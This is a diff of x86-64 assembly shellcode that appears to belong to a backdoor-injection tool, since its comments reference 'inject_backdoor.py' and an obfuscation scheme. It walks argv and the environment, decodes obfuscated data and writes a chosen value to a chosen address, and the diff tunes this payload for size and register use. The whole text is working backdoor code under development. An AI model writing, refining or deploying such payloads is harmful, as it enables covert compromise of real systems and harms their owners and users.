@@ -13,15 +13,14 @@ _begin:
     mov rdi, [rbx] /* &_dl_argv */
 
     // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
-    mov rax, [rdi]
+    mov rcx, [rdi]
     movabs r10, ADDR_TO_WRITE
-    test eax, eax
-    jz bye
-    cmp byte ptr [rax], '/'
+    jrcxz bye
+    cmp byte ptr [rcx], '/'
     jnz bye
 
-    // Optimized (for size) loop for skipping argv
-    movqq rcx, rdi
+    /* Optimized (for size) loop for skipping argv */
+    /* No need to populate rcx: it is guaranteed to have a pointer now */
     xor eax, eax
     repnz scasq
 
@@ -31,7 +30,6 @@ _begin:
 env_check_loop:
     lodsq
     test eax, eax
-    movabs r11, VALUE_TO_WRITE
     jz env_check_okay
     mov eax, dword ptr [rax]
     ror eax, 1
@@ -57,6 +55,8 @@ decode_loop:
     // dword is zero: our obfuscation decodes all zero to all zero, and we
     // check that there are no aligned zero dword in inject_backdoor.py
     jz bye
+    nop
+    movabs r11, VALUE_TO_WRITE
     add eax, [rdi+rcx*4]
     loop decode_loop
 
